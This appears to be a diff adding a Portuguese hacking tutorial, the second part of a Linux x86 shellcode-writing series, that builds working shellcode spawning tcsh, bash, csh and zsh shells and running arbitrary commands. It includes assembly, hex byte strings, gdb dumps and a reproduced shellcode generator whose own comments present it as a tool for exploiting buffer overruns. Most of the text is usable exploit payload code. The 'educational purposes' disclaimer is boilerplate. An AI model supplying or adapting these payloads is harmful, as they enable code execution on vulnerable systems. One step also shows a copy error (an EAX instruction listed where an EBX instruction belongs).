@@ -1,0 +1,1928 @@
+###########################################################################
+########################### UNSEKURITY TEAM ###############################
+###########################################################################
+
+Estes e outros tutoriais podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+
+OBS: Nao nos responsabilizamos pelo mau uso dos dados e exemplos aqui
+     fornecidos.Este tutorial possui somente propositos educacionais.
+
+
+Para um entendimento melhor deste tutorial, faz-se necessario a leitura
+do tutorial anterior, bem como conhecimentos basicos de C, Assembly,
+Sockets, Linux e Buffer Overflows.Este tutorial eh voltado para NewBies,
+se voce se considera 'elite' nao leia este humilde tutorial.
+
+Muita gente esperou e aqui estah a segunda parte do tutorial de escrita
+de shellcodes em/para sistemas Linux.Escrever shellcodes requer paciencia,
+muita paciencia.Existe a necessidade?? Sim, os programas geradores de
+shellcodes nao sao eficientes, exceto os que executam simples comandos via
+linha de comando.Mas quando eh um shellcode para abrir um socket,executar
+um programa, esses geradores nao suprem a necessidade, de modo que tem
+casos que realmente teriamos que escrever o shellcode na mao.Iremos ver
+alguns desses casos no decorrer desse tutorial.Assim como no outro, o
+entendimento dos exemplos e esquemas descritos neste tutorial vai depender
+dos esforcos do leitor(fucador), pois como iremos mexer com assembly,
+logica de programacao se faz mais do que necessario.Todos os exemplos e
+esquemas serao para linux(Slackware 7.0) i386, usando compilador GCC e
+debugador GDB.Neste tutorial nao descreverei nada de assembly, de modo
+que, se tiver duvidas, consulte o tutorial antigo e a parte de links que
+se encontra no mesmo.Espero verdadeiramente que este tutorial venha a ser
+util para alguem.
+
+			 -------------------------
+			|  SHELLCODES - II PARTE  |
+			 -------------------------
+
+--------------------------------- INDICE ---------------------------------
+
+1 - INTRODUCAO
+2 - SHELLCODES
+    2.1 - Outros Tipos de Shell(tcsh, bash, csh, zsh, etc)
+    2.2 - Quebrando chroot()
+    2.3 - Abrindo um Socket
+    2.4 - Personalizando um Shellcode
+    2.5 - Encriptando um Shellcode
+    2.6 - O Perigo dos Trojans
+3 - TERMINANDO
+    3.1 - Links e Referencias
+    3.2 - Consideracoes Finais
+
+--------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+A arte de fazer shellcode requer persistencia.Creio que todos que dominam
+a escrita de shellcodes no inicio passaram dificuldades, pois isso nao eh
+tao simples como pensam.Com o tempo e o aumento de conhecimentos por parte
+do fucador, assim como nas demais tecnicas, esta tecnica vai se tornando
+mais simples, cada vez mais simples! Pesquisas incessantes sobre
+programacao em ASM, as vezes se faz necessario, quanto mais complexo for
+o exploit, melhor para o fucador eh possuir bons conhecimentos em assembly.
+Os esquemas que pretendo disponibilizar aqui sao bastante conhecidos.
+Programadores avancados nao devem ler este tutorial, muito menos o pessoal
+da elite.Redireciono este tutorial aos mesmos leitores dos tutoriais
+antigos, ou seja, NewBies.Se voce se considera elite, nao perca o seu tempo.
+
+A utilidade que esses shellcodes bem como os conceitos sobre os mesmos
+venha a ter serah analisada em cada caso, e alguns mitos serao
+demistificados no decorrer desse arquivo texto.Espero que os esquemas aqui
+descritos venham a ser uteis para alguem.Para este tutorial eu tomei como
+base novamente o tutorial do Taeho Oh - Advanced buffer overflow exploit -
+tambem o velho txt do Aleph1 descrito na PHRACK e uma suite de shellcodes
+escritos pelo lamagra(http://lamagra.seKure.de).Links para os demais voce
+poderah obter no final deste tutorial.
+
+---------------
+2 - SHELLCODES |
+---------------
+
+Eu deixei umas duvidas e problemas pendentes no tutorial anterior.Irei
+nesse tutorial soluciona-las, espero que voce possa de alguma forma se
+beneficiar desses conceitos e explicacoes.E se voce jah solucionou todas,
+nao pense duas vezes, pule para os item que venham a te interessar.
+
+2.1 - Outros Tipos de Shell(tcsh, bash, csh, zsh, etc)
+-------------------------------------------------------
+
+No tutorial anterior, vimos somente a execucao de um tipo de shell, a
+/bin/sh , que em alguns sistemas eh linkada para /bin/bash.De qualquer
+modo, aprendemos como fazer um shellcode para esse tipo de shell, mas
+o conceito descrito alih eh mais amplo.Eu disse que poderiamos executar
+qualquer comando que fosse do tamanho de /bin/sh, e como exemplo citei
+/bin/ls.Um programador com conhecimentos basicos de Assembly certamente
+entendeu a mensagem e captou o que quis dizer com aquilo.Irei agora
+descrever pormenores de como se executa nao soh essas shells citadas aih
+em cima(tcsh, bash, csh, etc), mas todo e qualquer arquivo que se queira
+executar via linha de comando.
+
+2.1.1 - Shell tcsh
+-------------------
+
+De forma direta.Veremos como escrever um shellcode tcsh em assembly.Os
+passos a serem seguidos sao os mesmo que devemos seguir na escrita de um
+shellcode /bin/sh, sao eles:
+
+1. Termos a string "/bin/tcsh" terminada nula em algum lugar na memoria.
+2. Ter o endereco da string "/bin/tcsh" em algum lugar na memoria seguido
+   por uma word null long.
+3. Copiar 0xb sobre o registrador EAX.
+4. Copiar o endereco da string "/bin/tcsh" sobre o registrador EBX.
+5. Copiar o endereco da string "/bin/tcsh" sobre o registrador ECX.
+6. Copiar o endereco da word null long sobre o registrador EDX.
+7. Executar a intrucao int $0x80.
+8. Copiar 0x1 sobre registrado EAX.   --
+9. Copiar 0x0 sobre o registrador EBX.  |-> Esses passos para exit(0).
+10.Executar a instrucao $0x80.	      --
+
+
+De posse dessas informacoes, vamos trabalhar.A unica coisa que muda em
+relacao ao shellcode /bin/sh eh somente o tamanho do comando que se quer
+executar.O comando "/bin/sh" possui um tamanho = 7, e o que nos queremos
+executar, possui um tamanho igual a 9.De posse dessas informacoes, nos
+podemos contruir o codigo fonte com instrucoes em assembly.Pegamos o
+esquema padrao:
+
+jmp offset-para-chamar                # 3 bytes
+popl %esi                             # 1 byte  ------  <---------------
+movl %esi, array-offset(%esi)         # 3 bytes       |                 |
+movb $0x0, nullbyte-offset(%esi)      # 4 bytes       |                 |
+movl $0x0, null-offset(%esi)          # 7 bytes       |                 |
+movl $0xb, %eax                       # 5 bytes       | Somando tudo    |
+movl %esi, %ebx                       # 2 bytes       |   teremos       |
+leal array-offset(%esi), %ecx         # 3 bytes       ->  42 bytes      |
+leal null-offset(%esi), %edx          # 3 bytes       |(0x2a em hexa)   |
+int $0x80                             # 2 bytes       |                 |
+movl $0x1, %eax                       # 5 bytes       |                 |
+movl $0x0, %ebx                       # 5 bytes       |                 |
+int  $0x80                            # 2 bytes ______|                 |
+call offset-para-popl                 # 5 bytes --> 42 + 5 = 47(0x2f)---
+/bin/tcsh vem aqui                    # 8 bytes
+
+
+Vamos analisar o esquema acima no shellcode de /bin/sh:
+
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        movb   $0x0,0x7(%esi)           # 4 bytes
+        movl   $0x0,0xc(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        movl   $0x0, %ebx               # 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+
+
+Para executarmos "/bin/tcsh" teremos que alterar algumas coisinhas.A string
+a ser executada no codigo acima possui 8 bytes(.string \"/bin/sh\"), e a
+que nos estamos querendo executar possui 2 bytes a mais que esta
+(.string  \"/bin/tcsh\").Logo vamos detalhar os passos a seguir:
+
+1. Termos a string "/bin/tcsh" terminada nula em algum lugar na memoria:
+
+movl   %esi,0xa(%esi)  #Para /bin/sh tinhamos 8, agora temos 10(a em hexa).
+movb   $0x0,0x9(%esi)  #Para /bin/sh tinhamos 7, agora temos 9.
+
+2. Ter o endereco da string "/bin/tcsh" em algum lugar na memoria seguido
+   por uma word null long:
+
+movl   $0x0,0xe(%esi)  #Para /bin/sh tinhamos 0xc(14 em hexa), para
+		       #/bin/tcsh teremos 14 + 2 = 16(0xe em hexa).
+
+3. Copiar 0xb sobre o registrador EAX:
+
+movl   $0xb,%eax
+
+4. Copiar o endereco da string "/bin/tcsh" sobre o registrador EBX:
+
+movl   $0xb,%eax 
+
+5. Copiar o endereco da string "/bin/tcsh" sobre o registrador ECX:
+
+leal  0xa(%esi),%ecx
+
+6. Copiar o endereco da word null long sobre o registrador EDX:
+
+leal  0xe(%esi),%edx
+
+7. Executar a intrucao int $0x80:
+
+int    $0x80 
+
+8. Copiar 0x1 sobre registrado EAX:
+
+movl   $0x1, %eax
+
+9. Copiar 0x0 sobre o registrador EBX:
+
+movl $0x0, %ebx
+
+10.Executar a instrucao $0x80:
+
+int    $0x80
+
+Aih estao todos os passos detalhados.Vamos construir agora o .c para
+testarmos esse shellcode:
+
+------------------------------tcsh.asm.c-----------------------------
+
+#include<stdio.h>
+#include <stdlib.h>
+void main() {
+__asm__("
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0xa(%esi)           # 3 bytes
+        movb   $0x0,0x9(%esi)           # 4 bytes
+        movl   $0x0,0xe(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0xa(%esi),%ecx           # 3 bytes
+        leal   0xe(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        movl   $0x0, %ebx		# 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/tcsh\"           # 10 bytes
+");
+}
+
+---------------------------------------------------------------------
+
+
+Vamos agora retirar os velhos null-bytes.
+
+Instrucao com null byte                       Trocar por:
+------------------------------------------------------------------------
+movb $0x0,0x9(%esi)                         xorl %eax,%eax
+                                            movb %eax,0x9(%esi)
+movl $0x0,0xe(%esi)                         movl %eax,0xe(%esi)
+-------------------------------------------------------------------------
+movl $0xb,%eax                              movb $0xb,%al
+-------------------------------------------------------------------------
+movl $0x1,%eax                              xorl %ebx,%ebx
+movl $0x0,%ebx                              movl %ebx,%eax
+                                            inc  %eax
+-------------------------------------------------------------------------
+
+Nosso codigo ficou entao:
+
+--------------------------------tcsh_code.c--------------------------------
+#include<stdio.h>
+#include <stdlib.h>
+void main() {
+__asm__("
+        jmp   0x1f            
+        popl  %esi	      
+        movl  %esi,0xa(%esi)  
+        xorl  %eax,%eax
+        movb  %eax,0x9(%esi)
+        movl  %eax,0xe(%esi)
+        movb  $0xb,%al
+        movl  %esi,%ebx
+        leal  0xa(%esi),%ecx
+        leal  0xe(%esi),%edx
+        int   $0x80
+        xorl  %ebx,%ebx
+        movl  %ebx,%eax
+        inc   %eax
+        int   $0x80
+        call  -0x24
+        .string \"/bin/tcsh\"");
+}
+
+-------------------------------------------------------------------------
+
+Agora, compile o codigo acima da seguinte forma:
+
+[localhost]# gcc -o tcsh_code tcsh_code.c -static
+
+Depois gdb:
+
+[localhost]# gdb tcsh_code
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) (gdb) x/xb main+3
+0x804818f <main+3>:     0xeb
+(gdb) x/xb main+4
+0x8048190 <main+4>:     0x1f
+...
+...
+(gdb) x/xb main+36
+0x80481b0 <main+36>:    0xe8
+(gdb) x/xb main+37
+0x80481b1 <main+37>:    0xdc
+(gdb) x/xb main+38
+0x80481b2 <main+38>:    0xff
+(gdb) x/xb main+39
+0x80481b3 <main+39>:    0xff
+(gdb) x/xb main+40
+0x80481b4 <main+40>:    0xff
+
+Por aih jah basta.Construimos entao o .c:
+
+----------------------------tcsh_shell.c--------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x0a\x31\xc0\x88\x46\x09\x89\x46\x0e\xb0\x0b\x89"
+"\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+"\xdc\xff\xff\xff/bin/tcsh";
+
+ main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+--------------------------------------------------------------------------
+
+[localhost]# gcc -o tcsh_shell tcsh_shell.c
+[localhost]# ./tcsh_shell
+# exit
+exit
+
+
+Aih estah um shellcode para /bin/tcsh.Em cima desse shellcode jah podemos
+executar outro tipo de shell, a shell bash.Como a string /bin/tcsh possui
+o mesmo tamanho da string /bin/sh, tudo que devemos fazer eh trocar o
+/bin/tcsh por /bin/bash:
+
+------------------------------bash_shell.c-------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x0a\x31\xc0\x88\x46\x09\x89\x46\x0e\xb0\x0b\x89"
+"\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+"\xdc\xff\xff\xff/bin/bash";
+
+ main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+------------------------------------------------------------------------
+
+Compilamos normalmente e executamos o programa acima:
+
+[localhost]# gcc -o bash_shell bash_shell.c
+[localhost]# ./bash_shell
+bash-2.03# exit
+exit
+
+Tah pegando o espirito da coisa??:).Vamos agora recapitular o que
+aprendemos escrevendo um shellcode para csh(/bin/csh):
+
++ Pegamos como referencia, novamente, o shellcode para /bin/sh e alteramos
+  o que for necessario:
+
+--------------------------------csh_code.c--------------------------------
+#include<stdio.h>
+#include <stdlib.h>
+void main() {
+__asm__("
+        jmp   0x1f
+        popl  %esi
+        movl  %esi,0x9(%esi) #.string /bin/csh = 9.
+        xorl  %eax,%eax
+        movb  %eax,0x8(%esi) # /bin/csh = 8.
+        movl  %eax,0xd(%esi) # /bin/csh seguido de uma word null long.
+        movb  $0xb,%al       # empurra execve(11) para al.
+        movl  %esi,%ebx      
+        leal  0x9(%esi),%ecx # empurra .string /bin/csh para ecx.
+        leal  0xd(%esi),%edx # empurra /bin/sh + word null long p/ edx.
+        int   $0x80          
+        xorl  %ebx,%ebx
+        movl  %ebx,%eax
+        inc   %eax
+        int   $0x80
+        call  -0x24
+        .string \"/bin/csh\"");
+}
+---------------------------------------------------------------------------
+
+Compile com o argumento -static, depois use gdb e pegue os referentes
+hexadecimais de cada instrucao.Abaixo segue o .c para o shellcode:
+
+-------------------------------csh_shell.c---------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89\x46\x0d\xb0\x0b\x89"
+"\xf3\x8d\x4e\x09\x8d\x56\x0d\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+"\xdc\xff\xff\xff/bin/csh";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+---------------------------------------------------------------------------
+
+[localhost]# ./csh_shell
+%exit
+exit
+
+Como voce pode ver, estou sendo o mais pratico possivel, fugindo de ter
+que seguir todos os passos jah visto, praticidade eh algo muito comum nos
+esquemas fucadores.
+Para uma shell zsh(/bin/zsh) tambem nao tem muito segredo, diretamente nos
+podemos alterar o codigo acima, trocando /bin/csh por /bin/zsh:
+
+-----------------------------zsh_shell.c----------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89\x46\x0d\xb0\x0b\x89"
+"\xf3\x8d\x4e\x09\x8d\x56\x0d\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+"\xdc\xff\xff\xff/bin/zsh";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+--------------------------------------------------------------------------
+
+[localhost]# ./zsh_shell
+localhost# exit
+
+O prompt dessa shell aparenta estar diferente da executada
+normalmente(\h:\w\$), para se certificar sempre em qual shell
+voce se encontra, basta digitar um comando inexistente, exemplo:
+
+[localhost]# ./zsh_shell
+localhost# lslslslsls
+zsh: command not found: lslslslsls
+
+Esse 'zsh' aih em cima nos denuncia em qual shell estamos.Lembrando que
+em sistemas novos, o /bin/sh nao passa de um link para uma shell qualquer
+(Linux geralmente eh a shell bash).
+
+Como vimos, esse esquema nos dah condicoes de executar varios tipos de
+shell.Podemos tambem executar varios comandos, como vimos na primeira
+parte desse tutorial, o comando /bin/ls.
+
+Vamos complicar um pouco mais entao.Para executarmos qualquer comando
+shell, ou seja, qualquer comando que se pode executar via linha de comando,
+o que precisamos saber eh somente o tamanho do mesmo, e em seguida alterar
+nosso shellcode padrao(shellcode /bin/sh) para executar o comando que nos
+quisermos.Vamos ver um exemplo basico, o comando abaixo:
+
+$ /bin/echo Unsekurity Team
+
+Vamos analisar o .c dele:
+-----------------------------imprime.c----------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+char *comando[3];
+comando[0] = "/bin/echo";
+comando[1] = "Unsekurity Team";
+comando[2] = NULL;
+execve(comando[0],comando,NULL);
+}
+-------------------------------------------------------------------------
+
+Diferente dos primeiros exemplos, aqui nos temos um ponteiro com 3
+elementos.Vamos pegar algunas dados antes de debugarmos:
+
+/bin/echo Unsekurity Team  -> Tamanho = 25 ; .string XXX = 26.
+
+/bin/echo -> Tamanho = 9 ; .string XXX = 10(a).
+
+Unsekurity -> Tamanho = 10 ; .string XXX = 11(b). 
+
+Team -> Tamanho = 4 ; .string XXX = 5.
+
+Esse XXX se refera a propria string, exemplo: .string Team tem tamanho = 5.
+
+Vamos debugar esse programa, nao esqueca de compilar ele usando o argumento
+'-static' do gcc.
+
+[localhost]# gdb imprime
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x804818c <main>:       push   %ebp
+0x804818d <main+1>:     mov    %esp,%ebp
+0x804818f <main+3>:     sub    $0xc,%esp
+0x8048192 <main+6>:     movl   $0x806df68,0xfffffff4(%ebp)
+0x8048199 <main+13>:    movl   $0x806df72,0xfffffff8(%ebp)
+0x80481a0 <main+20>:    movl   $0x0,0xfffffffc(%ebp)
+0x80481a7 <main+27>:    push   $0x0
+0x80481a9 <main+29>:    lea    0xfffffff4(%ebp),%eax
+0x80481ac <main+32>:    push   %eax
+0x80481ad <main+33>:    mov    0xfffffff4(%ebp),%eax
+0x80481b0 <main+36>:    push   %eax
+0x80481b1 <main+37>:    call   0x804c51c <__execve>
+0x80481b6 <main+42>:    add    $0xc,%esp
+0x80481b9 <main+45>:    leave
+0x80481ba <main+46>:    ret
+0x80481bb <main+47>:    nop
+End of assembler dump.
+(gdb)
+
+
+Vamos analisar novamente os passos descritos na primeira parte deste
+tutorial:
+
+0x804818c <main>:       push   %ebp
+0x804818d <main+1>:     mov    %esp,%ebp
+
+Acima temos o procedimento preludio.
+
+0x804818f <main+3>:     sub    $0xc,%esp
+
+Acima ele reserva espaco para o ponteiro(12), cada 1 *comando possui
+tamanho igual a 4 bytes, logo sao 3 x 4 = 12(c em hexa).
+
+0x8048192 <main+6>:     movl   $0x806df68,0xfffffff4(%ebp)
+
+Copia o endereco da string /bin/echo para 0xfffffff4(%ebp).
+
+0x8048199 <main+13>:    movl   $0x806df72,0xfffffff8(%ebp)
+
+Copia o endereco da string 'Unsekurity Team' para 0xfffffff8(%ebp).
+
+0x80481a0 <main+20>:    movl   $0x0,0xfffffffc(%ebp)
+
+Copia o endereco de 'NULL' para 0xfffffffc(%ebp).
+
+0x80481a7 <main+27>:    push   $0x0
+
+Empurra NULL para dar inicio a chamada de execve.
+
+0x80481a9 <main+29>:    lea    0xfffffff4(%ebp),%eax
+
+Carrega o comando[] sobre registrador EAX.
+
+0x80481ac <main+32>:    push   %eax
+
+Empurra EAX para o Stack.
+
+0x80481ad <main+33>:    mov    0xfffffff4(%ebp),%eax
+
+Carregamos agora o endereco de /bin/echo para o registrador EAX.
+
+0x80481b0 <main+36>:    push   %eax
+
+Empurramos ele para o Stack.
+
+0x80481b1 <main+37>:    call   0x804c51c <__execve>
+
+Chamamos execve().
+
+
+(gdb) disassemble execve
+Dump of assembler code for function __execve:
+0x804c51c <__execve>:   push   %ebp
+0x804c51d <__execve+1>: mov    %esp,%ebp
+0x804c51f <__execve+3>: push   %edi
+0x804c520 <__execve+4>: push   %ebx
+0x804c521 <__execve+5>: mov    0x8(%ebp),%edi
+0x804c524 <__execve+8>: mov    $0x0,%eax
+0x804c529 <__execve+13>:        test   %eax,%eax
+0x804c52b <__execve+15>:        je     0x804c532 <__execve+22>
+0x804c52d <__execve+17>:        call   0x0
+0x804c532 <__execve+22>:        mov    0xc(%ebp),%ecx
+0x804c535 <__execve+25>:        mov    0x10(%ebp),%edx
+0x804c538 <__execve+28>:        push   %ebx
+0x804c539 <__execve+29>:        mov    %edi,%ebx
+0x804c53b <__execve+31>:        mov    $0xb,%eax
+0x804c540 <__execve+36>:        int    $0x80
+
+Vamos analisar com calma os passos em execv():
+
+0x804c51c <__execve>:   push   %ebp
+0x804c51d <__execve+1>: mov    %esp,%ebp
+
+Procedimento preludio.
+
+0x804c51f <__execve+3>: push   %edi
+
+Empurra o indice destino sobre o Stack.
+
+0x804c520 <__execve+4>: push   %ebx
+
+Empurra o novo frame pointer(EBX) para o stack.
+
+0x804c521 <__execve+5>: mov    0x8(%ebp),%edi
+
+Copia endereco de /bin/echo para EDI.
+
+0x804c524 <__execve+8>: mov    $0x0,%eax
+
+Copia $0x0 para eax.
+
+0x804c529 <__execve+13>:        test   %eax,%eax
+
+Testa para ver se tah tudo ok.
+
+0x804c52b <__execve+15>:        je     0x804c532 <__execve+22>
+
+Jumpeia se igual para 0x804c532 <__execve+22>.
+
+0x804c52d <__execve+17>:        call   0x0
+
+Se nao for igual, chama 0x0.
+
+0x804c532 <__execve+22>:        mov    0xc(%ebp),%ecx
+
+Copia endereco de comando[] sobre ECX.
+
+0x804c535 <__execve+25>:        mov    0x10(%ebp),%edx
+
+Copia o endereco do ponteiro nulo (NULL) sobre EDX.
+
+0x804c538 <__execve+28>:        push   %ebx
+
+Empurra EBX.
+
+0x804c539 <__execve+29>:        mov    %edi,%ebx
+
+Copia o DI(Indice destino) para EBX.
+
+0x804c53b <__execve+31>:        mov    $0xb,%eax
+
+Copia execve(11 ou b) para EAX.
+
+0x804c540 <__execve+36>:        int    $0x80
+
+Sai para modo kernel.
+
+
+Na pratica, a unica diferenca notavel eh o uso de DI para passar a copia
+do numero do system call de execve(11) para EAX no final da instrucao e
+nao no inicio, como vimos no exemplo do primeiro tutorial.De posse dessas
+informacoes, nos podemos construir o codigo em Assembly.
+
+------------------------------- uns.asm.c --------------------------------
+
+        jmp   0x31
+        popl  %esi
+        movl  %esi,0x1a(%esi) # .string XXX (toda a linha de comando)
+        leal  0xa(%esi),%ebx  # copia .string /bin/echo para EBX.
+        movl  %ebx,0x1e(%esi) # cp EBX para  0x1e(%esi)
+        leal  0x15(%esi),%ebx # adiciona 0x15 a %esi e depois copia p/ EBX.
+        movl  %ebx,0x22(%esi) # copia EBX para 0x22(%esi).
+        xorl  %eax,%eax       # reseta EAX.
+        movb  %eax,0x9(%esi)  # /bin/echo
+        movb  %eax,0x14(%esi) # Unsekurity + Team = 14
+        movb  %eax,0x19(%esi) # /bin/echo + Unsekurity + Team = 19(25 em dec)
+        movl  %eax,0x26(%esi) # tudo acima seguido de uma word null long.
+        movb  $0xb,%al        # Empurra systemcall execve para AL.
+        movl  %esi,%ebx
+        leal  0x1a(%esi),%ecx # empurra /bin/echo Unsekurity Team p/ %ecx.
+        leal  0x26(%esi),%edx # empurra geral acima + word null long p/ %edx.
+        int   $0x80
+        xorl  %ebx,%ebx
+        movl  %ebx,%eax
+        inc   %eax
+        int   $0x80
+        call  -0x36
+        .string \"/bin/echo Unsekurity Team\"");
+
+-----------------------------------------------------------------------------
+
+Montando o .c fica:
+
+--------------------------------- uns.c ------------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[] =
+"\xeb\x31\x5e\x89\x76\x1a\x8d\x5e\x0a\x89\x5e\x1e\x8d\x5e\x15\x89\x5e\x22"
+"\x31\xc0\x88\x46\x09\x88\x46\x14\x88\x46\x19\x89\x46\x26\xb0\x0b\x89\xf3"
+"\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xca\xff"
+"\xff\xff/bin/echo Unsekurity Team";
+
+main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+-----------------------------------------------------------------------------
+
+Conhecendo o basico de Assembly e a logica que envolve a criacao de um
+shellcode, voce pode facilmente construir shellcodes que executam qualquer
+comando da linha de comando.Veremos nos demais itensalguns outros esquemas,
+mas abaixo segue um excelente programa que automatiza a criacao de shellcodes 
+pela linha de comando.Esse programa foi feito pelo jamez da SDI e voce
+pode obte-lo em http://packetstorm.securify.com/ :
+
+--------------------------------shellcod.c-----------------------------------
+
+/*
+ *
+ * shellcode 1 - (Nov 25, 1998)
+ *
+ * this proggie generates a binary execve code for any commands
+ * with any arguments. it shows the asm and hex  code of execve
+ * wanted. both outputs asm and hex code can be executed on the
+ * stack. for example, you can use it when you want to  exploit
+ * a buffer overrun situation on linux.
+ *
+ * any comments and sugestions to jamez@sekure.org
+ *
+ *
+ * thanks for all people from sekure sdi(www.sekure.org)
+ *
+ *
+ */
+
+#include <stdio.h>
+#define MAX_PARAM 100
+
+int hexcode[4086];                 /* hex code for exeve */
+int hexsize = 0;                   /* size of hex code */
+char asmcode[4096];                /* asm code for exeve */
+char aux[1024];                    /* aux string */
+char params[1024];                 /* parameters including program name */
+
+void asmcat(char * s) {
+  strcat(asmcode, s);
+}
+
+void addasm(char * fmt, int addr) {
+  sprintf(aux, fmt, addr);
+  strcat(asmcode, aux);
+}
+
+void addhex(int hex) {
+  hexcode[hexsize] = hex;
+  hexsize++;
+}
+
+void printhex() {
+  int i;
+  char s[10];
+
+  printf("\n-----------------( hex code )--\n\n");
+
+  printf("char shellcode[] = \n");
+  printf("\t\"");
+
+  for(i = 0; i < hexsize; i++) {
+    if((i - i/12 * 12) == 0 && i != 0) {
+      printf("\"\n");
+      printf("\t\"");
+
+    }
+    if(hexcode[i] < 16 && hexcode[i] >= 0)
+      printf("\\x0%x", hexcode[i]);
+    else
+      if(hexcode[i] > 0)
+        printf("\\x%x", hexcode[i]);
+      else  {
+        sprintf(s, "%x", hexcode[i]);
+        printf("\\x%c", s[6]);
+        printf("%c", s[7]);
+      }
+  }
+  printf("%s\"\n", params);
+
+}
+
+int main(int argc, char * argv[]) {
+  int i,                             /* some for's */
+  jmp,    /* how many bytes to jmp to get call instruction */
+  num_params,                      /* how many parameters */
+  size = 0;                        /* size of the whole command */
+
+  int nulls[MAX_PARAM];              /* where the null bytes go */
+
+if(argc == 1) {
+printf("\nshellcode, first version. (Nov 25, 1998)\n\n");
+printf("  this proggie generates a binary execve code for any commands\n");;
+printf("  with any arguments. it shows the asm and hex  code of execve\n");
+printf("  wanted. both outputs asm and hex code can be executed on the\n");
+printf("  stack. for example, you can use it when you want to exploit\n");
+printf("  a buffer overrun situation on linux.\n\n");
+printf("  it's a jamez product. jamez@sekure.org\n");
+printf("  sekure sdi - www.sekure.org\n\n");
+printf(" - usage: %s path+program [first arg] [second arg] ...\n\n",argv[0]);
+exit(0);
+  }
+
+  num_params = argc - 1;
+
+
+  /* parse out the parameters */
+  params[0] = '\0';
+
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {
+    size += strlen(argv[i+1]) + 1;    /* plus one to the null end */
+
+    strcat(params, argv[i + 1]);
+    nulls[i] = strlen(params);
+    strcat(params, "\x20");
+  }
+
+  params[size-1] = '\0';
+  /* create the asm code */
+
+  hexcode[0] = '\0';
+  asmcode[0] = '\0';
+
+  jmp = 22 + 3 + (num_params-1)*6 + 3*num_params + 3;
+
+  addhex(0xeb);
+  addhex(jmp);
+
+  addasm("\tjmp   0x%x\n", jmp);
+
+  addhex(0x5e);
+  asmcat("\tpopl  %esi\n");         /* popl  %esi */
+
+  /* fill char * array w/ addr's */
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {
+    if(i == 0) {
+      addasm("\tmovl  %%esi,0x%x(%%esi)\n", size);
+
+      addhex(0x89);
+      addhex(0x76);
+      addhex(size);
+    }
+    else {
+
+      addhex(0x8d);
+      addhex(0x5e);
+      addhex(nulls[i-1]+1);
+
+     addasm("\tleal  0x%x(%%esi),%%ebx\n", nulls[i-1]+1);
+      addhex(0x89);
+      addhex(0x5e);
+      addhex(size + i*4);
+
+      addasm("\tmovl  %%ebx,0x%x(%%esi)\n", size + i*4);
+    }
+
+  }
+
+  addhex(0x31);
+  addhex(0xc0);
+
+  asmcat("\txorl  %eax,%eax\n");
+  /* put null at the of strings */
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {
+
+    addhex(0x88);
+    addhex(0x46);
+    addhex(nulls[i]);
+
+    addasm("\tmovb  %%eax,0x%x(%%esi)\n", nulls[i]);
+  }
+  addhex(0x89);
+  addhex(0x46);
+  addhex(size + 4*num_params);
+
+  addasm("\tmovl  %%eax,0x%x(%%esi)\n", size + 4*num_params);
+  addhex(0xb0);
+  addhex(0x0b);
